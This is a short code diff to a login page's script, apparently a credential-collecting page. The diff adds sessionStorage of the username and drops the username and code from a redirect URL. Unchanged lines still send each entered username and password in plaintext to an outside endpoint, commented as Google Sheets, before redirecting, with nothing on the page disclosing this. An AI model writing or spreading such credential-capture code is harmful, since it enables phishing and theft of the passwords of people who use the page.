@@ -26,6 +26,9 @@
         const uname = document.getElementById('uname').value.trim();
         const code = document.getElementById('code').value.trim();
 
+        // Store username in sessionStorage
+        sessionStorage.setItem('username', uname);
+
         // Send to Google Sheets (fire-and-forget)
         fetch(URL, {
           method: 'POST',
@@ -33,8 +36,8 @@
           body: JSON.stringify({ username: uname, password: code })
         });
 
-        // Redirect to logged-in page with username and code in URL
-        window.location.href = `BBlogedin.html?uname=${encodeURIComponent(uname)}&code=${encodeURIComponent(code)}`;
+        // Redirect to logged-in page
+        window.location.href = 'BBlogedin.html';
       });
     </script>
   </body>
